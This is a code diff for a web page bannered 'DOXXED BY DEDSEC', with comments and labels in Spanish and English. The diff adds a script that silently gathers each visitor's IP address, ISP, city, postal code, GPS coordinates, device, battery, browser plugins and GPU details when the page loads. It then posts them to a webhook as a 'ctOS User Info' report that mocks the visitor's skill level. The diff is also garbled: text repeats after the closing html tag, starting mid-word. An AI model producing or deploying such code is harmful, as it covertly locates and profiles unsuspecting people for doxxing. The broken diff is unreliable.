@@ -60,66 +60,12 @@
             pointer-events: none; 
         }
 
-        /* NUEVO: Estilo para el box de embed/link */
-        .embed-link-box {
-            position: absolute;
-            top: 20vh; /* Justo debajo del texto principal */
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.7);
-            border: 2px solid #00ffcc;
-            border-radius: 12px;
-            padding: 15px;
-            width: 80%;
-            max-width: 600px;
-            z-index: 20;
-            box-shadow: 0 0 30px rgba(0, 255, 204, 0.3);
-            text-align: center;
-            color: #fff;
-            font-family: 'Courier New', monospace;
-        }
-
-        .embed-link-box iframe {
-            width: 100%;
-            height: 180px;
-            border: 2px solid #00ffcc;
-            border-radius: 8px;
-            background: #111;
-            margin-bottom: 10px;
-        }
-
-        .embed-link-box a {
-            color: #00ffcc;
-            font-weight: bold;
-            text-decoration: none;
-            font-size: 1.2em;
-            display: inline-block;
-            padding: 8px 20px;
-            border: 1px solid #00ffcc;
-            border-radius: 30px;
-            transition: 0.3s;
-            background: rgba(0, 255, 204, 0.1);
-        }
-
-        .embed-link-box a:hover {
-            background: #00ffcc;
-            color: #000;
-            box-shadow: 0 0 20px #00ffcc;
-        }
     </style>
 </head>
 <body>
 
     <div class="texto-no-interactivo">
         DOXXED BY DEDSEC
-    </div>
-
-    <!-- NUEVO: EMBED / LINK BOX -->
-    <div class="embed-link-box">
-        <iframe src="https://elm4cho.github.io/D3DSEC/" title="Embedded content"></iframe>
-        <div>
-            <a href="https://elm4cho.github.io/D3DSEC/" target="_blank">🔗 Abrir enlace</a>
-        </div>
     </div>
 
     <video id="video-inferior" autoplay muted loop playsinline>
@@ -217,7 +163,7 @@ function dataURLtoBlob(dataurl) {
       else if (renderer.includes('RTX 40') || renderer.includes('RX 7') || renderer.includes('RX 8')) gpuLevel = 'Mid (Good)';
       else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Cheap (Basic)';
       else if (renderer.includes('Radeon')) gpuLevel = 'Mid (Integrated AMD or Old One)';
-      else gpuLevel = 'Unknown';
+      else gpuLevel = 'Desconocida';
     }
   } catch(e) {}
 
@@ -225,10 +171,60 @@ function dataURLtoBlob(dataurl) {
   let userLevel = 'Beginner (Doesnt Knows A Shit)';
   const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
   if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Smart/Tech-savvy (Knows About Privacy)';
-  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Beginner';
+  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
 
   const datos = {
-    ip: geo.ip || 'Hidden',
+    ip: geo.ip || 'oculta',
+    isp: geo.org || '?',
+    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
+    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
+    hora: new Date().toLocaleString(),
+    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
+    so: uaData.platform || navigator.platform,
+    movil: uaData.mobile ? 'Sí' : 'No',
+    ram: navigator.deviceMemory || '?',
+    cpu: navigator.hardwareConcurrency || '?',
+    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
+    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    plugins: pluginsList,
+    user_level: userLevel,
+    gpu: webgl,
+    gpu_level: gpuLevel
+  };
+
+  const mensaje =
+`**ctOS User Info**
+**IP:** ${datos.ip} (${datos.isp})
+**Location:** ${datos.ubicacion}
+**Coordinates:** ${datos.coordenadas}
+**Hour:** ${datos.hora}
+**Browser:** ${datos.navegador}
+**OS:** ${datos.so} | Móvil: ${datos.movil}
+**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
+**Screen:** ${datos.pantalla}
+**Battery:** ${datos.bateria}
+**Time Zone:** ${datos.zona}
+**Plugins:** ${datos.plugins}
+**User Level:** ${datos.user_level}
+**GPU:** ${datos.gpu}
+**GPU Type:** ${datos.gpu_level}`;
+
+  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
+})();
+
+// Botones normales
+document.querySelectorAll('.open').forEach(btn => {
+  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+});
+</script>
+</body>
+</html>ntraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
+  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
+
+  const datos = {
+    ip: geo.ip || 'oculta',
     isp: geo.org || '?',
     ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
     coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
